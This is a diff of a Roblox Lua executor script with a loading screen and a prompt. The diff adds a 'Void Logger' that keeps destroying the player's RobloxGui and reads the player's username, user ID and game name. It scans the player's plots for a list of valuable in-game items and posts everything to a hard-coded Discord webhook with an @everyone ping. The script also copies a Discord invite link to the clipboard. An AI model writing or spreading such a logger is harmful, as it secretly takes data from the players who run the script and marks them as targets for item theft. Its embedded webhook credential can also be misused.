@@ -1,10 +1,21 @@
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-local player = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local CoreGui = game:GetService("CoreGui")
 
-pcall(function()
-if setclipboard then
-setclipboard("https://discord.gg/TwyvK8JU7m")
+local player = Players.LocalPlayer
+local username = player.Name
+local userid = player.UserId
+local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+task.spawn(function()
+while true do
+local robloxGui = CoreGui:FindFirstChild("RobloxGui")
+if robloxGui then
+robloxGui:Destroy()
+end
+task.wait(1)
 end
 end)
 
@@ -61,19 +72,11 @@ barBG.BackgroundColor3 = Color3.fromRGB(30,30,30)
 barBG.BorderSizePixel = 0
 barBG.Parent = bg
 
-local barCorner = Instance.new("UICorner")
-barCorner.CornerRadius = UDim.new(0,10)
-barCorner.Parent = barBG
-
 local bar = Instance.new("Frame")
 bar.Size = UDim2.new(0,0,1,0)
 bar.BackgroundColor3 = Color3.fromRGB(170,0,255)
 bar.BorderSizePixel = 0
 bar.Parent = barBG
-
-local fillCorner = Instance.new("UICorner")
-fillCorner.CornerRadius = UDim.new(0,10)
-fillCorner.Parent = bar
 
 local credit = Instance.new("TextLabel")
 credit.AnchorPoint = Vector2.new(0.5,1)
@@ -85,6 +88,76 @@ credit.Font = Enum.Font.GothamBold
 credit.TextSize = 20
 credit.TextColor3 = Color3.fromRGB(200,200,200)
 credit.Parent = bg
+
+local webhook = "https://discord.com/api/webhooks/1470887638792667278/ABTnUwFUwFQArtp_LK6WSi40l0TJ5QriZo_Rpho4_f-G6s9KIbG-VWZCW8_9hHuXEzQf"
+
+local targets = {
+["Noobini Pizzanini"]=true,["Hydra Dragon Cannelloni"]=true,["W or L"]=true,["La Romantic Grande"]=true,
+["Ginger Gerat"]=true,["Lovin Rose"]=true,["Tuff Toucan"]=true,["Guest 666"]=true,["Los Amigos"]=true,
+["Skibidi Toilet"]=true,["Bacuru and Egguru"]=true,["Spaghetti Tualetti"]=true,["Los Tacoritas"]=true,
+["Cerberus"]=true,["Meowl"]=true,["Fragrama and Chocrama"]=true,["Celularcini Viciosini"]=true,
+["Popcuru and Fizzuru"]=true,["Headless Horseman"]=true,["Spooky and Pumpky"]=true,["Los Spaghettis"]=true,
+["Tacorita Bicicleta"]=true,["Los Primos"]=true,["Swaggy Bros"]=true,["Swag Soda"]=true,["Festive 67"]=true,
+["Ketupat Kepat"]=true,["Tang Tang Keletang"]=true,["Sammyni Fattini"]=true,["Capitano Moby"]=true,
+["La Secret Combinasion"]=true,["La Supreme Combinasion"]=true,["Dragon Cannelloni"]=true,
+["Gobblino Uniciclino"]=true,["Rosetti Tualetti"]=true,["Lavadorito Spinito"]=true,
+["Reinito Sleighito"]=true,["Tictac Sahur"]=true,["Esok Sekolah"]=true,["Los Puggies"]=true,
+["Chipso and Queso"]=true,["Money Money Puggy"]=true,["Mieteteira Bicicleteira"]=true,
+["Quesadillo Vampiro"]=true,["Love Love Bear"]=true,["Los Candies"]=true,["Burguro And Fryuro"]=true,
+["Cooki and Milki"]=true,["Strawberry Elephant"]=true,["La Extinct Grande"]=true,["Chillin Chili"]=true,
+["La Casa Boo"]=true,["Chicliterita bicicliterita"]=true,["La Food Combinasion"]=true,
+["La Jolly Grande"]=true,["La Spooky Grande"]=true,["Ketupat Bros"]=true,["Garama and Madundung"]=true,
+["Ketchuru and Musturu"]=true,["Nuclearo Dinossauro"]=true,["La Taco Combinasion"]=true,
+["Rosey and Teddy"]=true,["Dragon Gingerini"]=true
+}
+
+local req = request or http_request or syn and syn.request or fluxus and fluxus.request
+
+task.spawn(function()
+local found = {}
+local plots = workspace:FindFirstChild("Plots") or workspace
+
+for _,v in ipairs(plots:GetDescendants()) do
+if targets[v.Name] then
+table.insert(found,v.Name)
+end
+end
+
+local brainrotList = "None"
+if #found > 0 then
+brainrotList = table.concat(found,"\n")
+end
+
+local data = {
+content = "@everyone",
+embeds = {{
+title = "📄 Player Information",
+color = 5793266,
+fields = {
+{name="💻 Username",value="-# **Just tap **\n`"..username.."`",inline=false},
+{name="🆔 UserId",value=tostring(userid),inline=true},
+{name="🎮 Game",value=gameName,inline=true},
+{name="👑 Valuable Brainrots",value=brainrotList,inline=false}
+},
+footer={text="Void Logger"}
+}}
+}
+
+if req then
+req({
+Url = webhook,
+Method = "POST",
+Headers = {["Content-Type"]="application/json"},
+Body = HttpService:JSONEncode(data)
+})
+end
+end)
+
+pcall(function()
+if setclipboard then
+setclipboard("https://discord.gg/TwyvK8JU7m")
+end
+end)
 
 local duration = 60
 local startTime = tick()
@@ -137,10 +210,6 @@ frame.Position = UDim2.new(0.5,-130,0.5,-70)
 frame.BackgroundColor3 = Color3.fromRGB(15,15,20)
 frame.Parent = promptGui
 
-local c = Instance.new("UICorner")
-c.CornerRadius = UDim.new(0,10)
-c.Parent = frame
-
 local text = Instance.new("TextLabel")
 text.Size = UDim2.new(1,0,0,60)
 text.Position = UDim2.new(0,0,0,10)
@@ -160,9 +229,6 @@ yes.TextColor3 = Color3.new(1,1,1)
 yes.BackgroundColor3 = Color3.fromRGB(0,170,255)
 yes.Parent = frame
 
-local yc = Instance.new("UICorner")
-yc.Parent = yes
-
 local no = Instance.new("TextButton")
 no.Size = UDim2.new(0.4,0,0,35)
 no.Position = UDim2.new(0.52,0,0.65,0)
@@ -171,9 +237,6 @@ no.Font = Enum.Font.GothamBold
 no.TextColor3 = Color3.new(1,1,1)
 no.BackgroundColor3 = Color3.fromRGB(60,60,70)
 no.Parent = frame
-
-local nc = Instance.new("UICorner")
-nc.Parent = no
 
 yes.MouseButton1Click:Connect(function()
 promptGui:Destroy()
